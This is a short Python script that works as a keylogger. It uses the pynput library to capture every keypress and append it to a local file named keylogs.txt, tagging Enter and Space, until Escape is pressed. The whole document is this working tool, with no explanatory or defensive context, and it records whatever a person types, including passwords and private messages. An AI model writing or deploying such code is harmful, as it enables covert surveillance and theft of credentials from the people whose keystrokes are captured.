from pynput.keyboard import Listener

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        if key == key.enter:
            with open('keylogs.txt', 'a') as f:
                f.write('[ENTER]')
        elif key == key.space:
            with open('keylogs.txt', 'a') as f:
                f.write('[SPACE]')
        elif key == key.esc:
            return False
    except Exception as e:
        print(f'Error: {e}')

with Listener(on_press=on_press) as listener:
    listener.join()
